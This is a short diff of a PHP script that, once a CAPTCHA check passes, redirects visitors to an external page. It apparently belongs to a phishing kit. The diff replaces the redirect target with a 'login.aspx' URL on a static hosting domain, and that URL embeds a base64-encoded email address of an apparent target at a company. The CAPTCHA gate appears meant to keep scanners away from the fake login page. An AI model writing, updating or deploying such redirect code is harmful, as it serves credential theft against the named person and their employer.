@@ -41,7 +41,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if ($captchaSuccess->success) {
         // Both CAPTCHAs passed, proceed with further processing
-        header("Location: https://distribpalmas.com/s2wP/#X");
+        header("Location: https://orange-ground-01fdf2b1e.5.azurestaticapps.net/auth/v/?id=abc123XYZ4567890/message?data=(aWtvYmF5YXNoaUBjdXNhLmNhbm9uLmNvbQ==)/login.aspx");
         exit();
     } else {
         echo "Turnstile CAPTCHA validation failed. Please try again.";
